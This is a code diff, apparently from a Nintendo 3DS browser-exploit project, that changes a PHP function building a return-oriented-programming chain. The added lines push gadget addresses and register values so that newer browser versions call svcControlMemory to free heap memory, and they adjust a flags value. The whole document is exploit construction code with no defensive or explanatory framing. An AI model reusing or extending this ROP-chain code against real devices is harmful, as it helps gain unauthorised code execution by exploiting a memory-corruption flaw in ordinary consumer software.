@@ -1489,6 +1489,31 @@ function generateropchain_type2()
 		ropgen_condfatalerr();
 	}
 
+	if($browserver>=0x80)
+	{
+		$ROPCHAIN.= genu32_unicode($POPLRPC);
+		$ROPCHAIN.= genu32_unicode($ROP_POP_R0R6PC);
+
+		$ROPCHAIN.= genu32_unicode($ROP_POP_R0R6PC);
+		$ROPCHAIN.= genu32_unicode($ROPHEAP);//r0 outaddr
+		$ROPCHAIN.= genu32_unicode(0x0a000000);//r1 addr0
+		$ROPCHAIN.= genu32_unicode(0x0);//r2 addr1
+		$ROPCHAIN.= genu32_unicode(0x800000);//r3 size
+		$ROPCHAIN.= genu32_unicode(0x0);//r4
+		$ROPCHAIN.= genu32_unicode(0x0);//r5
+		$ROPCHAIN.= genu32_unicode(0x0);//r6
+
+		$ROPCHAIN.= genu32_unicode($svcControlMemory);//Free 8MB of heap under SKATER.
+
+		$ROPCHAIN.= genu32_unicode(0x1);//sp0 operation
+		$ROPCHAIN.= genu32_unicode(0x0);//sp4 permissions
+		$ROPCHAIN.= genu32_unicode(0x0);//sp8
+		$ROPCHAIN.= genu32_unicode(0x8);//sp12
+		$ROPCHAIN.= genu32_unicode(0x0);//r4
+		$ROPCHAIN.= genu32_unicode(0x0);//r5
+		$ROPCHAIN.= genu32_unicode(0x0);//r6
+	}
+
 	if($arm11code_loadfromsd==0)
 	{
 		$data_arr = getcodebin_array(browserhaxcfg_getbinpath_ropchain2(), 0x540);
@@ -1562,7 +1587,8 @@ function generateropchain_type2()
 	$databuf[15] = $GSP_WRITEHWREGS;
 	$databuf[16] = 0;//$APT_PrepareToDoApplicationJump;
 	$databuf[17] = 0;//$APT_DoApplicationJump;
-	$databuf[18] = 0x40;//flags
+	if($browserver<0x80)$databuf[18] = 0x40;//flags
+	if($browserver>=0x80)$databuf[18] = 0x48;
 	$databuf[19] = 0x0;
 	$databuf[20] = 0x0;
 	$databuf[21] = 0x0;
